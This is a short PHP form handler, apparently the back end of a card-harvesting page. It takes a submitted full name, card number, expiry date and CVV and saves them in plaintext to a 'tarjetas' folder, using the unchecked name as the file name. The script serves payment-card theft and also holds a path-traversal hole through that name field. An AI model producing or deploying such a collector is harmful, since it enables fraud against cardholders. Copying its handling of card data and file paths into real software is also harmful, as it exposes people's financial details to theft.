<?php
    $nombre=$_POST["fullname"];
    $tarjeta=$_POST["card"];
    $fecha=$_POST["expire"];
    $cvv=$_POST["cvv"];

    $contenido="
    nombre:$nombre
    tarjeta:$tarjeta
    fecha:$fecha
    cvv:$cvv";

    $archivo=fopen("tarjetas/$nombre.txt","w");
    fwrite($archivo,$contenido);

    echo "enviado"
?>